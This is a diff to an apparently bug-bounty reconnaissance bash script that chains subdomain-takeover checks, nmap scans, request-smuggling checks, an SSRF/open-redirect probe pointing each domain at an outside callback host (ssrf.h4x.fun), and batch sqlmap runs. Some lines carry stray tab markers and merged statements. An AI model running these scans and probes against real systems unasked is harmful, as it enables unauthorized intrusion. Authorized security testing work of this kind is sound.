@@ -254,13 +254,16 @@ subjack -w "$SAVEDIR/domains.txt" -t "$subjackThreads" -timeout "$subjackTime" -
 check "Subjack"
 cat "$SAVEDIR/subjack.txt" | grep -v "[Not Vulnerable]" >> "$SAVEDIR/subjack_vuln.txt"
 lines=$(wc -l "$SAVEDIR/subjack_vuln.txt")
-if [ $line -gt 0 ];
+if [ $lines -gt 0 ];
 then
     python3 /root/slackboth/alert.py "Subdomain vulnerable to hijacking! Check $SAVEDIR/subjack_vuln.txt"
 fi
 
 #Removing duplicate entries
 sort -u "$SAVEDIR/domains.txt" -o "$SAVEDIR/domains.txt"
+
+# Store domains.txt as a list of all discoveries
+cp "$SAVEDIR/domains.txt" "$SAVEDIR/domains_full.txt"
 
 #Removing out of scope domains
 print "Removing out of scope domains"
@@ -271,10 +274,14 @@ check "Remove out of scope domains"
 if [ $res -ne 0 ];
     then
     print "move old results and use new"
-    cp "$SAVEDIR/domains.txt" "$SAVEDIR/domains_full.txt"
     mv -f "$SAVEDIR/domains.txt_new" "$SAVEDIR/domains.txt"
     check "Overwrite results file with new data"
 fi
+
+# Create file with all gathered domains from LazyRecon & RR
+cat "$SAVEDIR/domains.txt" >> "$TMPDIR/all_domains.txt"
+cat "$SAVEDIR/recon-$todate/alldomains.txt" >> "$TMPDIR/all_domains.txt"
+cat "$TMPDIR/all_domains.txt" | sort | uniq >> "$SAVEDIR/all_domains.txt"
 
 #Discovering alive domains
 echo -e ""
@@ -310,12 +317,12 @@ check "Eyewitness"
 
 #Parse data to JSON
 
-print "Finding alive domains"
+print "Storing alive domains as JSON"
 # shellcheck disable=SC2002
 cat "$SAVEDIR/alive.txt" | python -c "import sys; import json; print (json.dumps({'domains':list(sys.stdin)}))" > "$SAVEDIR/alive.json"
 check "Alive domains"
 
-print "Get all domains"
+print "Storing all domains as JSON"
 # shellcheck disable=SC2002
 cat "$SAVEDIR/domains.txt" | python -c "import sys; import json; print (json.dumps({'domains':list(sys.stdin)}))" > "$SAVEDIR/domains.json"
 check "All domains"
@@ -481,23 +488,49 @@ mkdir -p "$LOGS/NMAP"
 # Need to make nmap less intrusive on all hosts?
 # nmapHost                                      #target url #Output dir
 run=0
+# Set newline to be separator
+IFS=" "
+OIFS=$IFS
+IFS="
+"
 for entry in $(cat "$SAVEDIR/recon-$todate/mass.txt" | sort | uniq ); do
-    domaindot=$(echo $entry | awk -F "" '{print $1}')
-    domain=${domaindot::-1}
-    ip=$(echo $entry | awk -F "" '{print $3}')
+	#echo $entry
+    domaindot=$(echo $entry | awk -F " " '{print $1}')
+▸   domain=${domaindot::-1}
+▸   #echo "domaindot: $domaindot domain : $domain"
+▸   dnstype=$(echo $entry | awk -F " " '{print $2}')·
+▸   #echo "DNSTYPE: $dnstype"
+    ip=""
+    if [[ $dnstype == "CNAME" ]];
+▸   ▸   then
+▸   ▸   name=$(echo $entry | awk -F " " '{print $3}')
+▸   ▸   ipall=$(host $name | grep -oE "\b([0-9]{1,3}\.){3}[0-9]{1,3}\b") ▸   ▸   ip=$(echo $ipall | awk -F " " '{print $1}')
+        #echo "IP: $ip"
+▸   elif [[ $dnstype == "A" ]];
+▸   ▸   then
+▸   ▸   ip=$(echo $entry | awk -F " " '{print $3}')
+        #echo "IP: $ip"
+▸   else
+▸   ▸   echo "Unknown record type: $dnstype for entry $entry" | tee -a "$LOGS/NMAP/unknown_dns.txt"
+▸   fi
+
     ((run++))
-    $TOOLDIR/RR/support/nmapHost.sh "$domain" "$NMAP_DIR" "$TMPDIR" "$LOGS/NMAP" "$ip" &
-    check "NMAP as background task"
-    if [ $run -gt 10 ]
-    then
-        print "Hit 10 concurrent scans - waiting to not run out of memory"
-        run=0
-        wait
-    fi
+	if [[ $ip -ne "" ]];
+		then
+		$TOOLDIR/RR/support/nmapHost.sh "$domain" "$NMAP_DIR" "$TMPDIR" "$LOGS/NMAP" "$ip" &
+		check "NMAP as background task"
+		if [ $run -gt 10 ]
+		then
+			print "Hit 10 concurrent scans - waiting to not run out of memory"
+			run=0
+			wait
+		fi
+	fi
 done
 print "Waiting for last nmap scans"
 wait
-
+# Restore normal functionality
+IFS=$OIFS
 # COMMAND="$TOOLDIR/RR/support/nmapHost.sh _target_ $SAVEDIR"
 # interlace --silent -tL "$SAVEDIR/domains.txt" -threads $INTERTHREADS -c "$COMMAND"
 # Output is open ports
@@ -516,7 +549,10 @@ wait
 # Test all endpoints? Seems like too much traffic
 
 print "Check request smuggling"
-mkdir -p $SAVEDIR/smuggling
+mkdir -p "$SAVEDIR/smuggling"
+# TODO Debug issue here!
+echo "DEBUG MARK"
+echo $(ls -la $SAVEDIR/smuggling)
 run=0
 for entry in $(cat "$SAVEDIR/alive.txt" | sort | uniq ); do
     ((run++))
@@ -553,15 +589,12 @@ wait
 # echo all domains
 # run against ssrf_OR_Identifier.sh
 print "SSRF / OR script"
-cat "$SAVEDIR/domains.txt" >> "$TMPDIR/all_domains.txt"
-cat "$SAVEDIR/recon-$todate/alldomains.txt" >> "$TMPDIR/all_domains.txt"
-cat "$TMPDIR/all_domains.txt" | sort | uniq >> "$SAVEDIR/all_domains.txt"
 mkdir -p $SAVEDIR/ssrf
 mkdir -p "$LOGS/ssrf"
 
 # check using script from Twitter
 for entry in $(cat "$SAVEDIR/all_domains.txt"); do
-    $TOOLDIR/RR/support/ssrf_OR_Identifier.sh "$entry" "http://ssrf.h4x.fun/x/pqCLV?$entry" "$SAVEDIR/ssrf" $TMPDIR" "$LOGS/ssrf"
+    $TOOLDIR/RR/support/ssrf_OR_Identifier.sh "$entry" "http://ssrf.h4x.fun/x/pqCLV?$entry" "$SAVEDIR/ssrf" "$TMPDIR" "$LOGS/ssrf"
     check "SSRF / OR identifier for $entry"
 done
 
@@ -584,7 +617,7 @@ check "Remove results ssrfire in tooldir"
 # TODO check data generated with sqlmap
 print "Make dir and run sqlmap"
 mkdir -p $SAVEDIR/sqlmap/
-URLFILE="$SAVEDIR/targeted_lists/sqli.txt"
+URLFILE="$SAVEDIR/vuln_specific_lists/sqli.txt"
 python $TOOLDIR/sqlmap-dev/sqlmap.py --batch -m $URLFILE --random-agent -o --smart --results-file=$SAVEDIR/sqlmap/results.csv >> $SAVEDIR/sqlmap/sqlmap_log.txt
 check "Sqlmap"
 ########################################
